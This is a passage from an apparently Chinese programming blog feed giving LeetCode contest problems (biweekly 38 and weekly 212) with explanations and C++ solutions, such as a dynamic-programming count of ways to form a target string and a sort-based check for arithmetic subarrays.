&gt;= <span class="number">0</span> &amp;&amp; s[i - (l + <span class="number">1</span>)] == t[j - (l + <span class="number">1</span>)])</span><br><span class="line">                    l++;</span><br><span class="line">                <span class="keyword">int</span> r = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (i + (r + <span class="number">1</span>) &lt; n &amp;&amp; j + (r + <span class="number">1</span>) &lt; m &amp;&amp; s[i + (r + <span class="number">1</span>)] == t[j + (r + <span class="number">1</span>)])</span><br><span class="line">                    r++;</span><br><span class="line">                ans += (l + <span class="number">1</span>) * (r + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5156-矩阵转换后的秩"><a href="#5156-矩阵转换后的秩" class="headerlink" title="5156. 矩阵转换后的秩"></a>5156. 矩阵转换后的秩</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个字符串列表 words 和一个目标字符串<code>target</code>。words 中所有字符串都 长度相同  。</p><p>你的目标是使用给定的 words 字符串列表按照下述规则构造 target ：</p><ul><li>从左到右依次构造 target 的每一个字符。</li><li>为了得到 <code>target</code> 第 i 个字符（下标从 0 开始），当 <code>target[i] = words[j][k]</code> 时，你可以使用 <code>words</code>列表中第 <code>j</code>个字符串的第 k 个字符。</li><li>一旦你使用了 <code>words</code> 中第 j 个字符串的第 k 个字符，你不能再使用 words 字符串列表中任意单词的第 x 个字符<code>（x &lt;= k）</code>。也就是说，所有单词下标小于等于 k 的字符都不能再被使用。</li><li>请你重复此过程直到得到目标字符串 target 。<br>请注意， 在构造目标字符串的过程中，你可以按照上述规定使用 words 列表中 同一个字符串 的 多个字符 。</li></ul><p>请你返回使用 <code>words</code> 构造 <code>target</code> 的方案数。由于答案可能会很大，请对 109 + 7 取余 后返回。</p><p>（译者注：此题目求的是有多少个不同的 k 序列，详情请见示例。）</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [<span class="string">"acca"</span>,<span class="string">"bbbb"</span>,<span class="string">"caca"</span>], target = <span class="string">"aba"</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：总共有 <span class="number">6</span> 种方法构造目标串。</span><br><span class="line"><span class="string">"aba"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"acca"</span>)，下标为 <span class="number">1</span> (<span class="string">"bbbb"</span>)，下标为 <span class="number">3</span> (<span class="string">"caca"</span>)</span><br><span class="line"><span class="string">"aba"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"acca"</span>)，下标为 <span class="number">2</span> (<span class="string">"bbbb"</span>)，下标为 <span class="number">3</span> (<span class="string">"caca"</span>)</span><br><span class="line"><span class="string">"aba"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"acca"</span>)，下标为 <span class="number">1</span> (<span class="string">"bbbb"</span>)，下标为 <span class="number">3</span> (<span class="string">"acca"</span>)</span><br><span class="line"><span class="string">"aba"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"acca"</span>)，下标为 <span class="number">2</span> (<span class="string">"bbbb"</span>)，下标为 <span class="number">3</span> (<span class="string">"acca"</span>)</span><br><span class="line"><span class="string">"aba"</span> -&gt; 下标为 <span class="number">1</span> (<span class="string">"caca"</span>)，下标为 <span class="number">2</span> (<span class="string">"bbbb"</span>)，下标为 <span class="number">3</span> (<span class="string">"acca"</span>)</span><br><span class="line"><span class="string">"aba"</span> -&gt; 下标为 <span class="number">1</span> (<span class="string">"caca"</span>)，下标为 <span class="number">2</span> (<span class="string">"bbbb"</span>)，下标为 <span class="number">3</span> (<span class="string">"caca"</span>)</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [<span class="string">"abba"</span>,<span class="string">"baab"</span>], target = <span class="string">"bab"</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：总共有 <span class="number">4</span> 种不同形成 target 的方法。</span><br><span class="line"><span class="string">"bab"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"baab"</span>)，下标为 <span class="number">1</span> (<span class="string">"baab"</span>)，下标为 <span class="number">2</span> (<span class="string">"abba"</span>)</span><br><span class="line"><span class="string">"bab"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"baab"</span>)，下标为 <span class="number">1</span> (<span class="string">"baab"</span>)，下标为 <span class="number">3</span> (<span class="string">"baab"</span>)</span><br><span class="line"><span class="string">"bab"</span> -&gt; 下标为 <span class="number">0</span> (<span class="string">"baab"</span>)，下标为 <span class="number">2</span> (<span class="string">"baab"</span>)，下标为 <span class="number">3</span> (<span class="string">"baab"</span>)</span><br><span class="line"><span class="string">"bab"</span> -&gt; 下标为 <span class="number">1</span> (<span class="string">"abba"</span>)，下标为 <span class="number">2</span> (<span class="string">"baab"</span>)，下标为 <span class="number">3</span> (<span class="string">"baab"</span>)</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">words</span> = [<span class="string">"abcd"</span>], <span class="attr">target</span> = <span class="string">"abcd"</span></span><br><span class="line">输出：<span class="number">1</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">words</span> = [<span class="string">"abab"</span>,<span class="string">"baba"</span>,<span class="string">"abba"</span>,<span class="string">"baab"</span>], <span class="attr">target</span> = <span class="string">"abba"</span></span><br><span class="line">输出：<span class="number">16</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= words.length &lt;= 1000</code></li><li><code>1 &lt;= words[i].length &lt;= 1000</code></li><li><code>words</code> 中所有单词长度相同。</li><li><code>1 &lt;= target.length &lt;= 1000</code></li><li><code>words[i]</code> 和 <code>target</code>都仅包含小写英文字母。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-38/problems/number-of-ways-to-form-a-target-string-given-a-dictionary/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-38/problems/number-of-ways-to-form-a-target-string-given-a-dictionary/</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 常规的DP</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>常规的dp，没啥好说的。非常普通的动态规划即可搞定。</li><li>设<code>dp[i][j]</code>表示由字符串列表的前<code>j</code>个字符构成了目标串的前<code>i</code>个字符的方案数，则递推公式为:<script type="math/tex; mode=display">dp[i][j] = dp[i-1][j-1]*count(j,t[i]) + dp[i][j-1]</script>其中<code>count(j,t[i])</code>表示字符串列表中第<code>j</code>个字符中为<code>t[i]</code>的字符串的数目。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">1002</span>][<span class="number">1002</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> cnt[<span class="number">1002</span>][<span class="number">26</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numWays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; words, <span class="built_in">string</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = words.size();</span><br><span class="line">        <span class="keyword">int</span> l = words[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> n = target.size();</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="built_in">memset</span>(cnt,<span class="number">0</span>,<span class="keyword">sizeof</span>(cnt));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(l &lt; n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; l; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; ++j)&#123;</span><br><span class="line">                cnt[i][words[j][i]-<span class="string">'a'</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*intial*/</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = cnt[<span class="number">0</span>][target[<span class="number">0</span>]-<span class="string">'a'</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; l; ++i)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] += dp[<span class="number">0</span>][i<span class="number">-1</span>] + cnt[i][target[<span class="number">0</span>]-<span class="string">'a'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; l; ++j)&#123;</span><br><span class="line">                dp[i][j] = ((dp[i<span class="number">-1</span>][j<span class="number">-1</span>]*cnt[j][target[i]-<span class="string">'a'</span>])%mod + dp[i][j<span class="number">-1</span>])%mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][l<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biweekly-contest-38&quot;&gt;&lt;a href=&quot;#leetcode-biweekly-contest-38&quot; class=&quot;headerlink&quot; title=&quot;leetcode  biweekly contest 38&quot;&gt;&lt;/a&gt;leetcode  biweekly contest 38&lt;/h1&gt;&lt;p&gt;双周赛题目质量不行，第三题太垃圾的题目，竟然暴力就可以过。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/11/01/nXdUkOy95ZR1A2H.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5539-按照频率将数组升序排序&quot;&gt;&lt;a href=&quot;#5539-按照频率将数组升序排序&quot; class=&quot;headerlink&quot; title=&quot;5539. 按照频率将数组升序排序&quot;&gt;&lt;/a&gt;5539. 按照频率将数组升序排序&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个整数数组 &lt;code&gt;nums&lt;/code&gt; ，请你将数组按照每个值的频率 升序 排序。如果有多个值的频率相同，请你按照数值本身将它们 降序 排序。&lt;br&gt;请你返回排序后的数组。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】 周赛212</title>
    <link href="http://yoursite.com/2020/10/25/216/"/>
    <id>http://yoursite.com/2020/10/25/216/</id>
    <published>2020-10-25T15:02:50.956Z</published>
    <updated>2020-10-25T15:02:56.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-212"><a href="#leetcode-contest-212" class="headerlink" title="leetcode  contest 212"></a>leetcode  contest 212</h1><p>本周的题目质量质量非常不错，特别是第三题和第四题，思考的空间很大。</p><h2 id="5546-按键持续时间最长的键"><a href="#5546-按键持续时间最长的键" class="headerlink" title="5546. 按键持续时间最长的键"></a>5546. 按键持续时间最长的键</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><code>LeetCode</code>设计了一款新式键盘，正在测试其可用性。测试人员将会点击一系列键（总计 n 个），每次一个。</p><p>给你一个长度为 n 的字符串 <code>keysPressed</code> ，其中 <code>keysPressed[i]</code>表示测试序列中第 i 个被按下的键。releaseTimes 是一个升序排列的列表，其中 releaseTimes[i] 表示松开第 i 个键的时间。字符串和数组的 下标都从 0 开始 。第 0 个键在时间为 0 时被按下，接下来每个键都 恰好 在前一个键松开时被按下。</p><a id="more"></a><p>测试人员想要找出按键 持续时间最长 的键。第 i 次按键的持续时间为 <code>releaseTimes[i] - releaseTimes[i - 1]</code> ，第 0 次按键的持续时间为 <code>releaseTimes[0]</code> 。</p><p>注意，测试期间，同一个键可以在不同时刻被多次按下，而每次的持续时间都可能不同。</p><p>请返回按键 持续时间最长 的键，如果有多个这样的键，则返回 按字母顺序排列最大 的那个键。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：releaseTimes = [<span class="number">9</span>,<span class="number">29</span>,<span class="number">49</span>,<span class="number">50</span>], keysPressed = <span class="string">"cbcd"</span></span><br><span class="line">输出：<span class="string">"c"</span></span><br><span class="line">解释：按键顺序和持续时间如下：</span><br><span class="line">按下 'c' ，持续时间 <span class="number">9</span>（时间 <span class="number">0</span> 按下，时间 <span class="number">9</span> 松开）</span><br><span class="line">按下 'b' ，持续时间 <span class="number">29</span> - <span class="number">9</span> = <span class="number">20</span>（松开上一个键的时间 <span class="number">9</span> 按下，时间 <span class="number">29</span> 松开）</span><br><span class="line">按下 'c' ，持续时间 <span class="number">49</span> - <span class="number">29</span> = <span class="number">20</span>（松开上一个键的时间 <span class="number">29</span> 按下，时间 <span class="number">49</span> 松开）</span><br><span class="line">按下 'd' ，持续时间 <span class="number">50</span> - <span class="number">49</span> = <span class="number">1</span>（松开上一个键的时间 <span class="number">49</span> 按下，时间 <span class="number">50</span> 松开）</span><br><span class="line">按键持续时间最长的键是 'b' 和 'c'（第二次按下时），持续时间都是 <span class="number">20</span></span><br><span class="line">'c' 按字母顺序排列比 'b' 大，所以答案是 'c'</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：releaseTimes = [<span class="number">12</span>,<span class="number">23</span>,<span class="number">36</span>,<span class="number">46</span>,<span class="number">62</span>], keysPressed = <span class="string">"spuda"</span></span><br><span class="line">输出：<span class="string">"a"</span></span><br><span class="line">解释：按键顺序和持续时间如下：</span><br><span class="line">按下 's' ，持续时间 <span class="number">12</span></span><br><span class="line">按下 'p' ，持续时间 <span class="number">23</span> - <span class="number">12</span> = <span class="number">11</span></span><br><span class="line">按下 'u' ，持续时间 <span class="number">36</span> - <span class="number">23</span> = <span class="number">13</span></span><br><span class="line">按下 'd' ，持续时间 <span class="number">46</span> - <span class="number">36</span> = <span class="number">10</span></span><br><span class="line">按下 'a' ，持续时间 <span class="number">62</span> - <span class="number">46</span> = <span class="number">16</span></span><br><span class="line">按键持续时间最长的键是 'a' ，持续时间 <span class="number">16</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>releaseTimes.length == n</code></li><li><code>keysPressed.length == n</code></li><li><code>2 &lt;= n &lt;= 1000</code></li><li><code>0 &lt;= releaseTimes[i] &lt;= 109</code></li><li><code>releaseTimes[i] &lt; releaseTimes[i+1]</code></li><li><code>keysPressed</code> 仅由小写英文字母组成</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/weekly-contest-212/problems/slowest-key/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/weekly-contest-212/problems/slowest-key/</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>求出每个按键的持续时间即可，找到最大的按键时间的字母即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">slowestKey</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; releaseTimes, <span class="built_in">string</span> keysPressed)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> ans = keysPressed[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> maxTime = releaseTimes[<span class="number">0</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; releaseTimes.size(); ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> press = releaseTimes[i] - releaseTimes[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">if</span>(press &gt; maxTime)&#123;</span><br><span class="line">                maxTime = press;</span><br><span class="line">                ans = keysPressed[i];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(press == maxTime &amp;&amp; keysPressed[i] &gt; ans)&#123;</span><br><span class="line">                ans = keysPressed[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5547-等差子数组"><a href="#5547-等差子数组" class="headerlink" title="5547. 等差子数组"></a>5547. 等差子数组</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>如果一个数列由至少两个元素组成，且每两个连续元素之间的差值都相同，那么这个序列就是 等差数列 。更正式地，数列 s 是等差数列，只需要满足：对于每个有效的 i ， s[i+1] - s[i] == s[1] - s[0] 都成立。</p><p>例如，下面这些都是 等差数列 ：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span></span><br><span class="line"><span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span></span><br><span class="line"><span class="number">3</span>, <span class="number">-1</span>, <span class="number">-5</span>, <span class="number">-9</span></span><br></pre></td></tr></table></figure><br>下面的数列 不是等差数列 ：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span></span><br></pre></td></tr></table></figure><br>给你一个由 n 个整数组成的数组 nums，和两个由 m 个整数组成的数组 l 和 r，后两个数组表示 m 组范围查询，其中第 i 个查询对应范围 [l[i], r[i]] 。所有数组的下标都是 从 0 开始 的。</p><p>返回 boolean 元素构成的答案列表 answer 。如果子数组 <code>nums[l[i]], nums[l[i]+1], ... , nums[r[i]]</code> 可以 重新排列 形成 等差数列 ，answer[i] 的值就是 true；否则<code>answer[i]</code> 的值就是<code>false</code>。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">7</span>], l = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>], r = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">输出：[<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">true</span>]</span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">0</span> 个查询，对应子数组 [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>] 。可以重新排列为等差数列 [<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>] 。</span><br><span class="line">第 <span class="number">1</span> 个查询，对应子数组 [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">9</span>] 。无法重新排列形成等差数列。</span><br><span class="line">第 <span class="number">2</span> 个查询，对应子数组 [<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">7</span>] 。可以重新排列为等差数列 [<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>] 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">-12</span>,<span class="number">-9</span>,<span class="number">-3</span>,<span class="number">-12</span>,<span class="number">-6</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">-25</span>,<span class="number">-20</span>,<span class="number">-15</span>,<span class="number">-10</span>], l = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">7</span>], r = [<span class="number">4</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">输出：[<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">true</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>m == l.length</code></li><li><code>m == r.length</code></li><li><code>2 &lt;= n &lt;= 500</code></li><li><code>1 &lt;= m &lt;= 500</code></li><li><code>0 &lt;= l[i] &lt; r[i] &lt; n</code></li><li><code>-105 &lt;= nums[i] &lt;= 105</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/arithmetic-subarrays" target="_blank" rel="noopener">https://leetcode-cn.com/problems/arithmetic-subarrays</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 暴力排序即可</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>因为所有的数很小，我们直接将每个区间<code>[l[i],r[i]]</code>的元素进行拷贝并排序判断是否为等差数列，时间复杂度为$O(n^{2} + O(n\lgn))$.<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isArithmetic</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> ans = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.size(); ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nums[i] - nums[i<span class="number">-1</span>]) != (nums[<span class="number">1</span>] - nums[<span class="number">0</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; checkArithmeticSubarrays(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; l, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; r) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> m = l.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; ans(m,<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; curr;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = l[i]; j &lt;= r[i]; ++j)&#123;</span><br><span class="line">                curr.push_back(nums[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            sort(curr.begin(),curr.end());</span><br><span class="line">            ans[i] = isArithmetic(curr);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5548-最小体力消耗路径"><a href="#5548-最小体力消耗路径" class="headerlink" title="5548. 最小体力消耗路径"></a>5548. 最小体力消耗路径</h2><p>你准备参加一场远足活动。给你一个二维 <code>rows x columns</code>的地图 <code>heights</code>，其中 <code>heights[row][col]</code> 表示格子 <code>(row, col)</code>的高度。一开始你在最左上角的格子 (0, 0) ，且你希望去最右下角的格子 <code>(rows-1, columns-1)</code>（注意下标从 0 开始编号）。你每次可以往 上，下，左，右 四个方向之一移动，你想要找到耗费 体力 最小的一条路径。</p><p>一条路径耗费的 体力值 是路径上相邻格子之间 高度差绝对值 的 最大值 决定的。</p><p>请你返回从左上角走到右下角的最小 体力消耗值 。</p><p>示例 1：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：heights = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>],[<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：路径 [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">5</span>] 连续格子的差值绝对值最大为 <span class="number">2</span> 。</span><br><span class="line">这条路径比路径 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>] 更优，因为另一条路劲差值最大值为 <span class="number">3</span> 。</span><br></pre></td></tr></table></figure><p>示例 2：<br><figure class="highlight angelscript"><table><tr><td 